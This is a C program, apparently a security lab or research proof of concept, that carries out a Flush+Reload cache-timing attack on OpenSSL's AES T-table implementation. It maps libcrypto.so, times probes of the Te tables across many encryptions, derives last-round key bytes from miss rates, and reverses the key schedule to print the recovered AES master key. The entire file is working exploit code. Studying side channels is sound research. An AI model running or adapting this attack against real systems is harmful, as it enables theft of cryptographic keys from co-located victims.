#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "./cacheutils.h"
#include "./aes1.h"


// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (160)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (40000)

size_t sum;
size_t scount;

char * base;
char * end;

int bot_elems(double * arr, int N, int * bot, int n) {
    /*
       insert into bot[0],...,bot[n-1] the indices of n smallest elements 
       of arr[0],...,arr[N-1]
    */
    int bot_count = 0;
    int i;
    for (i = 0; i < N; ++i) {
        int k;
        for (k = bot_count; k > 0 && arr[i] < arr[bot[k - 1]]; k--);
        if (k >= n) continue;
        int j = bot_count;
        if (j > n - 1) {
            j = n - 1;
        } else {
            bot_count++;
        }
        for (; j > k; j--) {
            bot[j] = bot[j - 1];
        }
        bot[k] = i;
    }
    return bot_count;
}

int main() {
    int fd = open("/usr/local/lib/libcrypto.so", O_RDONLY);
    size_t size = lseek(fd, 0, SEEK_END);
    if (size == 0)
        exit(-1);
    size_t map_size = size;
    if (map_size & 0xFFF != 0) {
        map_size |= 0xFFF;
        map_size += 1;
    }
    base = (char * ) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
    end = base + size;

    unsigned char plaintext[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
    unsigned char ciphertext[128];
    unsigned char restoredtext[128];
    int countKeyCandidates[16][256];
    int cacheMisses[16][256];
    int totalEncs[16][256];
    double missRate[16][256];
    int lastRoundKeyGuess[16];

    for (int i = 0; i < 16; i++) {
        for (int j = 0; j < 256; j++) {
            totalEncs[i][j] = 0;
            cacheMisses[i][j] = 0;
            countKeyCandidates[i][j] = 0;
        }
    }

    AES_KEY key_struct;

    AES_set_encrypt_key(key, 128, & key_struct);

    uint64_t min_time = rdtsc();
    srand(min_time);
    sum = 0;
    char * probe[] = {
        base + 0x1df000,
        base + 0x1df400,
        base + 0x1df800,
        base + 0x1dfc00
    };

    // encrytions for Te0, Te1, Te2, Te3
    for (int t = 0; t < 4; t++) {
        for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i) {
            for (size_t j = 0; j < 16; ++j)
                plaintext[j] = rand() % 256;
            flush(probe[t]);
            AES_encrypt(plaintext, ciphertext, & key_struct);
            size_t time = rdtsc();
            maccess(probe[t]);
            size_t delta = rdtsc() - time;
            int x = (t + 2) % 4;
            totalEncs[x][(int) ciphertext[x]]++;
            totalEncs[x + 4][(int) ciphertext[x + 4]]++;
            totalEncs[x + 8][(int) ciphertext[x + 8]]++;
            totalEncs[x + 12][(int) ciphertext[x + 12]]++;
            if (delta > MIN_CACHE_MISS_CYCLES) {
                cacheMisses[x][(int) ciphertext[x]]++;
                cacheMisses[x + 4][(int) ciphertext[x + 4]]++;
                cacheMisses[x + 8][(int) ciphertext[x + 8]]++;
                cacheMisses[x + 12][(int) ciphertext[x + 12]]++;
            }
        }
    }

    // calculate the cache miss rates 
    for (int i = 0; i < 16; i++) {
        for (int j = 0; j < 256; j++) {
            missRate[i][j] = (double) cacheMisses[i][j] / totalEncs[i][j];
        }
    }

    int botIndices[16][16];
    // get the values of lowest missrates
    for (int i = 0; i < 16; i++) {
        bot_elems(missRate[i], 256, botIndices[i], 16);
    }

    for (int i = 0; i < 16; i++) {
        // loop through ciphertext bytes with lowest missrates
        for (int j = 0; j < 16; j++) {
            countKeyCandidates[i][botIndices[i][j] ^ 99]++;
            countKeyCandidates[i][botIndices[i][j] ^ 124]++;
            countKeyCandidates[i][botIndices[i][j] ^ 119]++;
            countKeyCandidates[i][botIndices[i][j] ^ 123]++;
            countKeyCandidates[i][botIndices[i][j] ^ 242]++;
            countKeyCandidates[i][botIndices[i][j] ^ 107]++;
            countKeyCandidates[i][botIndices[i][j] ^ 111]++;
            countKeyCandidates[i][botIndices[i][j] ^ 197]++;
            countKeyCandidates[i][botIndices[i][j] ^ 48]++;
            countKeyCandidates[i][botIndices[i][j] ^ 1]++;
            countKeyCandidates[i][botIndices[i][j] ^ 103]++;
            countKeyCandidates[i][botIndices[i][j] ^ 43]++;
            countKeyCandidates[i][botIndices[i][j] ^ 254]++;
            countKeyCandidates[i][botIndices[i][j] ^ 215]++;
            countKeyCandidates[i][botIndices[i][j] ^ 171]++;
            countKeyCandidates[i][botIndices[i][j] ^ 118]++;
        }
    }

    // find the max value in countKeyCandidate...
    // this is our guess at the key byte for that ctext position
    for (int i = 0; i < 16; i++) {
        int maxValue = 0;
        int maxIndex;
        for (int j = 0; j < 256; j++) {
            if (countKeyCandidates[i][j] > maxValue) {
                maxValue = countKeyCandidates[i][j];
                maxIndex = j;
            }
        }
        // save in the guess array
        lastRoundKeyGuess[i] = maxIndex;
    }

    // Algorithm to recover the master key from the last round key
    uint32_t roundWords[4];
    for (int r = 0; r < 4; r++) {
        int x = r * 4;
        roundWords[r] = (((uint32_t) lastRoundKeyGuess[x]) << 24) ^
            (((uint32_t) lastRoundKeyGuess[x + 1]) << 16) ^
            (((uint32_t) lastRoundKeyGuess[x + 2]) << 8) ^
            (((uint32_t) lastRoundKeyGuess[x + 3]));
    }

    uint32_t tempWord4, tempWord3, tempWord2, tempWord1;
    uint32_t rcon[10] = {
        0x36000000,
        0x1b000000,
        0x80000000,
        0x40000000,
        0x20000000,
        0x10000000,
        0x08000000,
        0x04000000,
        0x02000000,
        0x01000000
    };

    // loop to backtrack aes key expansion
    for (int i = 0; i < 10; i++) {
        tempWord4 = roundWords[3] ^ roundWords[2];
        tempWord3 = roundWords[2] ^ roundWords[1];
        tempWord2 = roundWords[1] ^ roundWords[0];

        uint32_t rotWord = (tempWord4 << 8) ^ (tempWord4 >> 24);

        tempWord1 = (roundWords[0] ^ rcon[i] ^ subWord(rotWord));

        roundWords[3] = tempWord4;
        roundWords[2] = tempWord3;
        roundWords[1] = tempWord2;
        roundWords[0] = tempWord1;
    }

    for (int i = 3; i >= 0; i--) {
        printf("%x, ", roundWords[i]);
    }
    printf("\n");
    close(fd);
    munmap(base, map_size);
    fflush(stdout);
    return 0;
}
